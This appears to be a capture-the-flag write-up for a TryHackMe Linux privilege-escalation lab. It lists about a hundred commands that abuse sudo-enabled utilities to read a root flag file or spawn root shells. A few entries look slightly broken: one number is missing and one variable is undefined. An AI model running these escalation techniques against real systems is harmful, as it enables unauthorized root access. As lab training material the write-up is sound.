#Linux Privesc Playground

##100 Ways of capturing root flags

https://tryhackme.com/room/privescplayground

1. sudo arp -v -f "/root/flag.txt"
2. sudo ash
3. sudo awk '//' "/root/flag.txt"
4. sudo bash
5. sudo base64 "/root/flag.txt" | base64 --decode
6. sudo busybox sh , sudo busybox cat /root/flag.txt
7. sudo cat /root/flag.txt
8. sudo chmod 0777 /root/flag.txt , cat /root/flag.txt
9. sudo chown $(id -un):$(id -gn) /root/flag.txt , cat /root/flag.txt
10. cp /root/flag.txt /dev/stdout
11. sudo csh , cat /root/flag.txt
12. cut -d "" -f1 /root/flag.txt
13. sudo dash , cat /root/flag.txt
14. date -f /root/flag.txt
15. emacs /root/flag.txt
16. sudo env /bin/sh , cat /root/flag.txt
17. expand /root/flag.txt
18. sudo expect -c 'spawn /bin/sh;interact' , cat /root/flag.txt
19.
 ```bash
TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
FACTERLIB=$TF facter
```
20. file -f /root/flag.txt
21. dd if=/root/flag.txt
22. diff --line-format=%L /dev/null  /root/flag.txt
23. sudo dmsetup ls --exec '/bin/sh -s' , cat /root/flag.txt
24. 
```bash 
TF=$(mktemp -d)
echo 'print(open("/root/flag.txt").read())' > $TF/setup.py
easy_install $TF
```
25. sudo find . -exec /bin/sh \; -quit , cat /root/flag.txt
26. sudo flock -u / /bin/sh , cat /root/flag.txt
27. fmt -999 /root/flag.txt
28. fold -w99999999 /root/flag.txt
29. 
```bash 
sudo ftp
!/bin/sh
cat /root/flag.txt
```
30. sudo gawk '//' /root/flag.txt
31. gdb -nx -ex 'python print(open("/root/flag.txt").read())' -ex quit
32.
```bash
sudo irb
puts File.read("/root/flag.txt")
```
33. sudo jq -R . /root/flag.txt
34. sudo ksh , cat /root/flag.txt
35. less /root/flag.txt
36. 
```bash
sudo logsave /dev/null /bin/sh -i
cat /root/flag.txt
```
37.
```bash
sudo ltrace -L /bin/sh
cat /root/flag.txt
```
38.
```bash
git help config
!/bin/sh
```
39. grep '' /root/flag.txt
40. head -c1G /root/flag.txt
41. ionice /bin/sh , cat /root/flag.txt
42. ip -force -batch /root/flag.txt
43. sudo lua -e 'os.execute("/bin/sh")' , cat /root/flag.txt
44. sudo man /root/flag.txt
45. sudo mawk '//' "/root/flag.txt"
46. more /root/flag.txt
47. 
```bash
sudo mount -o bind /bin/sh /bin/mount
sudo mount
cat /root/flag.txt
```
48. mv /root/flag.txt . , cat /root/flag.txt
49. nano /root/flag.txt
50. sudo nawk '//' /root/flag.txt
51. nice /bin/sh , cat /root/flag.txt
52. nl -bn -w1 -s '' /root/flag.txt
53. 
```bash
sudo nmap --interactive
nmap> !sh
cat /root/flag.txt
```
54. od -An -c -w9999 /root/flag.txt
55. openssl enc -in /root/flag.txt
56. sudo perl -e 'exec "/bin/sh";' , cat /root/flag.txt
57. pg /root/flag.txt
58. 
```bash
pic -U
.PS
sh X sh X
cat /root/flag.txt
```
59. 
```bash
pico -s /bin/sh
/bin/sh
Control+T
cat /root/flag.txt
```
60. 
```bash
TF=$(mktemp -d)
echo 'raise Exception(open("/root/flag.txt").read())' > $TF/setup.py
pip install $TF
```
61. sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }" , cat /root/flag.txt
62. python -c 'print(open("/root/flag.txt").read())'
63. readelf -a @$/root/flag.txt
64. rlwrap /bin/sh , cat /root/flag.txt
65. rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null , cat /root/flag.txt
67. sudo ruby -e 'puts File.read("/root/flag.txt")'
68. run-parts --new-session --regex '^sh$' /bin , cat /root/flag.txt
69. rvim /root/flag.txt
70. 
```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```
71. sudo screen , press SPACE ,  cat /root/flag.txt
72. sudo script -q /dev/null , cat /root/flag.txt
73. sed '' /root/flag.txt
74. sudo service ../../bin/sh , cat /root/flag.txt
75. setarch $(arch) /bin/sh , cat /root/flag.txt
76. socat stdin exec:/bin/sh , cat /root/flag.txt
77. sort -m /root/flag.txt
78. 
```bash
sudo sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
```
79. sudo ssh -F /root/flag.txt localhost
80. start-stop-daemon -n $RANDOM -S -x /bin/sh , cat /root/flag.txt
81. stdbuf -i0 /bin/sh , cat /root/flag.txt
82. strace -o /dev/null /bin/sh , cat /root/flag.txt
83. tail -c1G /root/flag.txt
84. sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh , cat /root/flag.txt
85. sudo taskset 1 /bin/sh , cat /root/flag.txt
86. 
```bash
tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```
87. /usr/bin/time /bin/sh , cat /root/flag.txt
88. timeout 7d /bin/sh , cat /root/flag.txt
89. sudo tmux , cat /root/flag.txt
90. ul /root/flag.txt
91. unexpand -t99999999 /root/flag.txt
92. uniq /root/flag.txt
93. sudo unshare /bin/sh , cat /root/flag.txt
94. vi /root/flag.txt
95. vim /root/flag.txt
96. sudo watch -x bash -c 'reset; exec bash 1>&0 2>&0' , cat /root/flag.txt
97. xargs -a /root/flag.txt -0 
98. xxd /root/flag.txt | xxd -r
99. 
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
100. sudo zsh , cat /root/flag.txt
